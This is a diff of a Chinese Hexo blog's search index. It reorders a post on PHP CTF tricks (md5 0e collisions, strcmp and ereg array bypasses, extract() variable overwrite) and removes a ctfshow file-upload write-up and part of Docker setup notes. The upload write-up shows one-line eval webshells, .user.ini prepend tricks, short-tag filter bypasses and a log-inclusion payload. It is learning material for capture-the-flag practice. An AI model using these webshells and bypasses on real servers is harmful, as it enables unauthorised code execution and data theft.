@@ -1,86 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CTF中常见的黑魔法</title>
-    <url>/2020/10/20/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%BB%91%E9%AD%94%E6%B3%95/</url>
-    <content><![CDATA[<p>本文也可以说是常见php特性考察的总结</p>
-<a id="more"></a>
-<h2 id="1-sha1和md5"><a class="header-anchor" href="#1-sha1和md5">¶</a>1.sha1和md5</h2>
-<p><strong>要求变量原值不同但md5或sha1相同的情况下</strong></p>
-<p>1.0e开头的全部相等（==判断）</p>
-<p>240610708 和 QNKCDZO md5值类型相似，但并不相同，在”==”相等操作符的运算下，结果返回了true.</p>
-<p>Md5和sha1一样</p>
-<p>2.利用数组绕过（===判断）</p>
-<p>Md5和sha1对一个数组进行加密将返回NULL；而NULL===NULL返回true，所以可绕过判断。</p>
-<h2 id="2-strcmp函数的绕过"><a class="header-anchor" href="#2-strcmp函数的绕过">¶</a>2.strcmp函数的绕过</h2>
-<p>strcmp 的参数只能是字符串，当我们传入数组时就会返回NULL，而判断使用的是==，NULL==0是 bool(true)的</p>
-<p><strong>代码测试</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;&#123;sadd44484878&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (strcmp(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$flag</span>)==<span class="number">0</span>)</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>get 传参 password[]  数组，成功打出flag</p>
-<p><a href="https://imgchr.com/i/sCEdxI"><img src="https://s3.ax1x.com/2021/01/03/sCEdxI.png" alt="sCEdxI.png"></a></p>
-<h2 id="3-Ereg匹配"><a class="header-anchor" href="#3-Ereg匹配">¶</a>3.Ereg匹配</h2>
-<p><strong>定义和用途</strong></p>
-<p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</p>
-<p>1.数组绕过</p>
-<p>ereg是处理字符串，传入数组之后，ereg是返回NULL</p>
-<p>2.%00截断绕过== 的比较</p>
-<p>测试环境： php5.3版本，php7不行</p>
-<p>测试代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">*<span class="comment">//$test=$_POST[&#x27;a&#x27;];*</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( ereg(<span class="string">&quot;c&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])== <span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;failure&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-<p><a href="https://imgchr.com/i/sCEhMq"><img src="https://s3.ax1x.com/2021/01/03/sCEhMq.png" alt="sCEhMq.png"></a></p>
-<p>加入%00，可以发现后面的c被截断了</p>
-<p><a href="https://imgchr.com/i/sCE5LV"><img src="https://s3.ax1x.com/2021/01/03/sCE5LV.png" alt="sCE5LV.png"></a></p>
-<h2 id="4-PHP弱类型比较"><a class="header-anchor" href="#4-PHP弱类型比较">¶</a>4.PHP弱类型比较</h2>
-<ol>
-<li>
-<p>== ：弱等于。在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。至于怎么转换后续会再赘述。</p>
-</li>
-<li>
-<p>=== ：强等于。在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型。</p>
-</li>
-</ol>
-<p>当要比较的两种字符串的类型相同时，== 和 === 是相等的。</p>
-<h3 id="PHP转换规则"><a class="header-anchor" href="#PHP转换规则">¶</a><strong>PHP转换规则</strong></h3>
-<ul>
-<li>若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串（例如&quot;aaa&quot;是不能转换为数字的字符串，而&quot;123&quot;或&quot;123aa&quot;就是可以转换为数字的字符串）或null，则转换为0；例如:</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> var_dump(12&#x3D;&#x3D;&quot;12&quot;)                                   &#x2F;&#x2F; true</span><br><span class="line"> var_dump(12&#x3D;&#x3D;&quot;12aa&quot;)                              &#x2F;&#x2F;true</span><br><span class="line"> var_dump( &quot;admin&quot;&#x3D;&#x3D;0)								&#x2F;&#x2F;true</span><br><span class="line"> var_dump(false&#x3D;&#x3D;&quot;&quot;&#x3D;&#x3D;0&#x3D;&#x3D;NULL)						&#x2F;&#x2F;true</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
-<ul>
-<li>布尔值true和任意字符串都弱相等。例如:</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(true&#x3D;&#x3D;&quot;hyuf&quot;)                   &#x2F;&#x2F;true</span><br></pre></td></tr></table></figure>
-<ul>
-<li>数字和“e&quot;开头加上数字的字符串（例如&quot;1e123”）会当作科学计数法去比较；</li>
-<li>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0；</li>
-<li>当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,'E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字，则其值就是开始的数字，否则，其值为0。</li>
-</ul>
-<h2 id="5-extract变量覆盖漏洞"><a class="header-anchor" href="#5-extract变量覆盖漏洞">¶</a>5.extract变量覆盖漏洞</h2>
-<p>直接看题</p>
-<p><a href="https://imgchr.com/i/sCVpdO"><img src="https://s3.ax1x.com/2021/01/03/sCVpdO.png" alt="sCVpdO.png"></a></p>
-<h3 id="extract-函数用法："><a class="header-anchor" href="#extract-函数用法：">¶</a>extract()函数用法：</h3>
-<p>extract() 函数从数组中将变量导入到当前的符号表。</p>
-<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
-<p>该函数返回成功设置的变量数目。</p>
-<p>如果当前符号表中有于数组键值变量名相同的，那么用数组键值的变量覆盖</p>
-<h3 id="trim（）函数"><a class="header-anchor" href="#trim（）函数">¶</a>trim（）函数</h3>
-<p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
-<p><a href="http://www.w3school.com.cn/php/func_string_ltrim.asp">ltrim()</a> - 移除字符串左侧的空白字符或其他预定义字符</p>
-<p><a href="http://www.w3school.com.cn/php/func_string_rtrim.asp">rtrim()</a> - 移除字符串右侧的空白字符或其他预定义字符</p>
-<p><strong>我们本题利用extract()函数的变量覆盖漏洞原理构造payload</strong></p>
-<p><strong>漏洞产生原因：extract()函数当只有一个参数时，默认的第二参数是：EXTR_OVERWRITE，如果有变量发生冲突，则覆盖已有的变量。</strong></p>
-<p>代码审计需要满足两个条件：1. if(isset($a)) == 》 TRUE</p>
-<p>2. if($a==$c) == 》 TRUE</p>
-<p>构造payload：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;利用extract()函数变量覆盖漏洞+php伪协议</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;999&amp;b&#x3D;data:&#x2F;&#x2F;,999</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;利用file_get_content()函数返回字符串+php弱类型（null &#x3D;&#x3D; &quot;string&quot;  &#x3D;&#x3D;》 true）</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;&amp;b&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;&amp;c&#x3D;</span><br></pre></td></tr></table></figure>
-<p><s>属于菜鸡的注释： 当file_get_connents 读入的不是一个文件是，返回的是false ，也就是 NULL</s></p>
-<p><s>所以我们可以不对 b变量进行赋值或者随意赋值，只要a 是 NULL 就行，如果要想让a 不是NULL 我们就可以利用php伪协议 data，这里不能使用 php://input 是因为 它限定的是GET方式传参</s></p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>常见黑魔法</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Buuctf刷题记录(二)</title>
     <url>/2021/01/21/Buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E4%BA%8C/</url>
     <content><![CDATA[<h2 id="极客大挑战-2019-BuyFlag"><a class="header-anchor" href="#极客大挑战-2019-BuyFlag">¶</a>[极客大挑战 2019]BuyFlag</h2>
@@ -198,6 +118,86 @@
       <categories>
         <category>刷题站</category>
         <category>buuctf</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>CTF中常见的黑魔法</title>
+    <url>/2020/10/20/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%BB%91%E9%AD%94%E6%B3%95/</url>
+    <content><![CDATA[<p>本文也可以说是常见php特性考察的总结</p>
+<a id="more"></a>
+<h2 id="1-sha1和md5"><a class="header-anchor" href="#1-sha1和md5">¶</a>1.sha1和md5</h2>
+<p><strong>要求变量原值不同但md5或sha1相同的情况下</strong></p>
+<p>1.0e开头的全部相等（==判断）</p>
+<p>240610708 和 QNKCDZO md5值类型相似，但并不相同，在”==”相等操作符的运算下，结果返回了true.</p>
+<p>Md5和sha1一样</p>
+<p>2.利用数组绕过（===判断）</p>
+<p>Md5和sha1对一个数组进行加密将返回NULL；而NULL===NULL返回true，所以可绕过判断。</p>
+<h2 id="2-strcmp函数的绕过"><a class="header-anchor" href="#2-strcmp函数的绕过">¶</a>2.strcmp函数的绕过</h2>
+<p>strcmp 的参数只能是字符串，当我们传入数组时就会返回NULL，而判断使用的是==，NULL==0是 bool(true)的</p>
+<p><strong>代码测试</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;&#123;sadd44484878&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (strcmp(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$flag</span>)==<span class="number">0</span>)</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>get 传参 password[]  数组，成功打出flag</p>
+<p><a href="https://imgchr.com/i/sCEdxI"><img src="https://s3.ax1x.com/2021/01/03/sCEdxI.png" alt="sCEdxI.png"></a></p>
+<h2 id="3-Ereg匹配"><a class="header-anchor" href="#3-Ereg匹配">¶</a>3.Ereg匹配</h2>
+<p><strong>定义和用途</strong></p>
+<p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</p>
+<p>1.数组绕过</p>
+<p>ereg是处理字符串，传入数组之后，ereg是返回NULL</p>
+<p>2.%00截断绕过== 的比较</p>
+<p>测试环境： php5.3版本，php7不行</p>
+<p>测试代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">*<span class="comment">//$test=$_POST[&#x27;a&#x27;];*</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( ereg(<span class="string">&quot;c&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])== <span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;failure&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p><a href="https://imgchr.com/i/sCEhMq"><img src="https://s3.ax1x.com/2021/01/03/sCEhMq.png" alt="sCEhMq.png"></a></p>
+<p>加入%00，可以发现后面的c被截断了</p>
+<p><a href="https://imgchr.com/i/sCE5LV"><img src="https://s3.ax1x.com/2021/01/03/sCE5LV.png" alt="sCE5LV.png"></a></p>
+<h2 id="4-PHP弱类型比较"><a class="header-anchor" href="#4-PHP弱类型比较">¶</a>4.PHP弱类型比较</h2>
+<ol>
+<li>
+<p>== ：弱等于。在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。至于怎么转换后续会再赘述。</p>
+</li>
+<li>
+<p>=== ：强等于。在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型。</p>
+</li>
+</ol>
+<p>当要比较的两种字符串的类型相同时，== 和 === 是相等的。</p>
+<h3 id="PHP转换规则"><a class="header-anchor" href="#PHP转换规则">¶</a><strong>PHP转换规则</strong></h3>
+<ul>
+<li>若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串（例如&quot;aaa&quot;是不能转换为数字的字符串，而&quot;123&quot;或&quot;123aa&quot;就是可以转换为数字的字符串）或null，则转换为0；例如:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> var_dump(12&#x3D;&#x3D;&quot;12&quot;)                                   &#x2F;&#x2F; true</span><br><span class="line"> var_dump(12&#x3D;&#x3D;&quot;12aa&quot;)                              &#x2F;&#x2F;true</span><br><span class="line"> var_dump( &quot;admin&quot;&#x3D;&#x3D;0)								&#x2F;&#x2F;true</span><br><span class="line"> var_dump(false&#x3D;&#x3D;&quot;&quot;&#x3D;&#x3D;0&#x3D;&#x3D;NULL)						&#x2F;&#x2F;true</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
+<ul>
+<li>布尔值true和任意字符串都弱相等。例如:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(true&#x3D;&#x3D;&quot;hyuf&quot;)                   &#x2F;&#x2F;true</span><br></pre></td></tr></table></figure>
+<ul>
+<li>数字和“e&quot;开头加上数字的字符串（例如&quot;1e123”）会当作科学计数法去比较；</li>
+<li>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0；</li>
+<li>当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,'E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字，则其值就是开始的数字，否则，其值为0。</li>
+</ul>
+<h2 id="5-extract变量覆盖漏洞"><a class="header-anchor" href="#5-extract变量覆盖漏洞">¶</a>5.extract变量覆盖漏洞</h2>
+<p>直接看题</p>
+<p><a href="https://imgchr.com/i/sCVpdO"><img src="https://s3.ax1x.com/2021/01/03/sCVpdO.png" alt="sCVpdO.png"></a></p>
+<h3 id="extract-函数用法："><a class="header-anchor" href="#extract-函数用法：">¶</a>extract()函数用法：</h3>
+<p>extract() 函数从数组中将变量导入到当前的符号表。</p>
+<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
+<p>该函数返回成功设置的变量数目。</p>
+<p>如果当前符号表中有于数组键值变量名相同的，那么用数组键值的变量覆盖</p>
+<h3 id="trim（）函数"><a class="header-anchor" href="#trim（）函数">¶</a>trim（）函数</h3>
+<p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
+<p><a href="http://www.w3school.com.cn/php/func_string_ltrim.asp">ltrim()</a> - 移除字符串左侧的空白字符或其他预定义字符</p>
+<p><a href="http://www.w3school.com.cn/php/func_string_rtrim.asp">rtrim()</a> - 移除字符串右侧的空白字符或其他预定义字符</p>
+<p><strong>我们本题利用extract()函数的变量覆盖漏洞原理构造payload</strong></p>
+<p><strong>漏洞产生原因：extract()函数当只有一个参数时，默认的第二参数是：EXTR_OVERWRITE，如果有变量发生冲突，则覆盖已有的变量。</strong></p>
+<p>代码审计需要满足两个条件：1. if(isset($a)) == 》 TRUE</p>
+<p>2. if($a==$c) == 》 TRUE</p>
+<p>构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;利用extract()函数变量覆盖漏洞+php伪协议</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;999&amp;b&#x3D;data:&#x2F;&#x2F;,999</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;利用file_get_content()函数返回字符串+php弱类型（null &#x3D;&#x3D; &quot;string&quot;  &#x3D;&#x3D;》 true）</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;&amp;b&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;&amp;c&#x3D;</span><br></pre></td></tr></table></figure>
+<p><s>属于菜鸡的注释： 当file_get_connents 读入的不是一个文件是，返回的是false ，也就是 NULL</s></p>
+<p><s>所以我们可以不对 b变量进行赋值或者随意赋值，只要a 是 NULL 就行，如果要想让a 不是NULL 我们就可以利用php伪协议 data，这里不能使用 php://input 是因为 它限定的是GET方式传参</s></p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>常见黑魔法</category>
       </categories>
   </entry>
   <entry>
@@ -563,151 +563,6 @@
       </categories>
   </entry>
   <entry>
-    <title>ctfshow入门之文件上传</title>
-    <url>/2021/01/15/ctfshow%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h2 id="151-152"><a class="header-anchor" href="#151-152">¶</a>151-152</h2>
-<p>传一个后缀为png的一句话,bp抓包改后缀 蚁剑连接即可</p>
-<h2 id="153"><a class="header-anchor" href="#153">¶</a>153</h2>
-<p>传了后缀为.php5的一句话 发现能成功上传但是 无法解析</p>
-<p><img src="https://img-blog.csdnimg.cn/20210116130923265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>看看大佬的wp,学了新姿势</p>
-<h3 id="前置知识"><a class="header-anchor" href="#前置知识">¶</a>前置知识</h3>
-<p><a href="https://wh1tecell.top/2021/01/16/htaccess%E5%92%8C-user-ini%E6%96%87%E4%BB%B6%E7%9A%84%E5%A6%99%E7%94%A8/">.user.ini的妙用</a></p>
-<h3 id="解题步骤"><a class="header-anchor" href="#解题步骤">¶</a>解题步骤</h3>
-<p>尝试上传.user.ini,发现上传成功<br>
-<img src="https://img-blog.csdnimg.cn/2021011623593150.png" alt="在这里插入图片描述"></p>
-<p>文件内容:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89</span><br><span class="line">auto_prepend_file &#x3D; 1.php</span><br></pre></td></tr></table></figure>
-<p>然后上传一张图片马,1.php<br>
-文件内容:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;flag&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>然后访问 /upload</p>
-<p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#x3D;system(&#39;cat ..&#x2F;f*&#39;);</span><br></pre></td></tr></table></figure>
-<h2 id="154"><a class="header-anchor" href="#154">¶</a>154</h2>
-<p>上传后缀为png的一句话发现文件内容不符合条件</p>
-<p>发现是php这个字符串不能出现</p>
-<p>于是pHp 大写成功绕过</p>
-<p>然后跟上一题一样的解法 蚁剑连接</p>
-<p><img src="https://img-blog.csdnimg.cn/2021011700022841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>得到flag</p>
-<h2 id="155"><a class="header-anchor" href="#155">¶</a>155</h2>
-<p>大写绕过不行了</p>
-<p>尝试使用短标签绕过<br>
-对于php的标签其他写法有四种</p>
-<p>1、前提是开启配置参数short_open_tags=on</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;? echo &#39;123&#39;;?&gt;</span><br></pre></td></tr></table></figure>
-<p>2、 不需要开启参数设置</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?&#x3D;(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;</span><br></pre></td></tr></table></figure>
-<p>3、前提是开启配置参数asp_tags=on，经过测试发现7.0及以上修改完之后也不能使用，而是报500错误，但是7.0以下版本在修改完配置后就可以使用了。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% echo &#39;123&#39;;%&gt;</span><br></pre></td></tr></table></figure>
-<p>4、不需要修改参数开关，但是只能在7.0以下可用。<br>
-对于该题，我们可用使用<code>&lt;?=(表达式)?&gt;</code>进行绕过，图片内容 <code>&lt;?=eval($_POST[flag]);?&gt;</code><br>
-剩下的步骤同153</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;echo &#39;123&#39;; &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="156"><a class="header-anchor" href="#156">¶</a>156</h2>
-<p>在前面的基础上过滤了 []那我们直接用{}来代替<br>
-图片马内容</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?&#x3D;eval($_POST&#123;1&#125;);?&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="157-159"><a class="header-anchor" href="#157-159">¶</a>157-159</h2>
-<p>直接将图片内容换成这个。。。算是投机取巧的方法吧  毕竟知道flag在哪里</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aa.png</span><br><span class="line"></span><br><span class="line">&lt;?&#x3D;&#96;tac ..&#x2F;f*&#96;?&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="160"><a class="header-anchor" href="#160">¶</a>160</h2>
-<p>使用 日志包含</p>
-<p>过滤了括号反引号还有一些关键字<br>
-利用日志包含绕过，图片内容<?=include"/var/lo"."g/nginx/access.lo"."g"?>因为log被过滤了。所以用拼接绕过<br>
-上传完.user.ini和图片后<br>
-访问网站然后修改ua头信息</p>
-<p><img src="https://img-blog.csdnimg.cn/20210122154255213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>接着访问/upload目录 就可</p>
-]]></content>
-      <categories>
-        <category>刷题站</category>
-        <category>ctfshow</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>docker之温故知新</title>
-    <url>/2021/02/11/docker%E4%B9%8B%E6%B8%A9%E6%95%85%E7%9F%A5%E6%96%B0/</url>
-    <content><![CDATA[<h2 id="Docker-安装"><a class="header-anchor" href="#Docker-安装">¶</a>Docker 安装</h2>
-<h3 id="Ubuntu-CentOS-安装"><a class="header-anchor" href="#Ubuntu-CentOS-安装">¶</a>Ubuntu/CentOS 安装</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL get.docker.com -o get-docker.sh</span><br><span class="line">sudo sh get-docker.sh --mirror Aliyun</span><br></pre></td></tr></table></figure>
-<h3 id="Kali-Debian-安装"><a class="header-anchor" href="#Kali-Debian-安装">¶</a>Kali/Debian 安装</h3>
-<p>Kali 是基于 Debian 封装的，所以两者安装方法大同小异。<br>
-Kali Linux 安装 Docker 用网上那个一键安装脚本貌似有点问题，这里单独记录一下，以便自己和其他网友使用：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加Docker PGP密钥</span></span><br><span class="line">curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置docker apt源 我这里用的国内阿里云的docker下载源</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;deb https://mirrors.aliyun.com/docker-ce/linux/debian buster stable&#x27;</span>&gt; /etc/apt/sources.list.d/docker.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新apt源</span></span><br><span class="line">apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果之前安装了docker的话 这里得卸载旧版本docker</span></span><br><span class="line">apt remove docker docker-engine docker.io</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装docker</span></span><br><span class="line">apt install docker-ce</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看版本</span></span><br><span class="line">docker version</span><br></pre></td></tr></table></figure>
-<h3 id="开机自启设置"><a class="header-anchor" href="#开机自启设置">¶</a>开机自启设置</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> docker</span><br><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure>
-<h2 id="Docker-优化"><a class="header-anchor" href="#Docker-优化">¶</a>Docker 优化</h2>
-<h3 id="Docker-国内加速器"><a class="header-anchor" href="#Docker-国内加速器">¶</a>Docker 国内加速器</h3>
-<p>不替换源对话，docker pull 拉去镜像对速度实在太龟速了，如果你很佛系对话可以不进行更换</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编辑这个文件，如果没有对话就创建这个文件</span></span><br><span class="line">vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>
-<p>替换内容如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里我使用对是国内163网易源，其他源可以自行百度替换。<br>
-配置完成后重启服务才可以生效：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
-<h2 id="Docker-基础命令"><a class="header-anchor" href="#Docker-基础命令">¶</a>Docker 基础命令</h2>
-<h3 id="搜索镜像"><a class="header-anchor" href="#搜索镜像">¶</a>搜索镜像</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search 关键词</span><br></pre></td></tr></table></figure>
-<h3 id="下载镜像"><a class="header-anchor" href="#下载镜像">¶</a>下载镜像</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull 镜像名</span><br></pre></td></tr></table></figure>
-<h3 id="查看已下载的镜像列表"><a class="header-anchor" href="#查看已下载的镜像列表">¶</a>查看已下载的镜像列表</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker image ls</span><br></pre></td></tr></table></figure>
-<h3 id="创建并使用容器"><a class="header-anchor" href="#创建并使用容器">¶</a>创建并使用容器</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it --name 容器名 镜像名/镜像ID /bin/bash</span><br></pre></td></tr></table></figure>
-<h3 id="查看当前容器"><a class="header-anchor" href="#查看当前容器">¶</a>查看当前容器</h3>
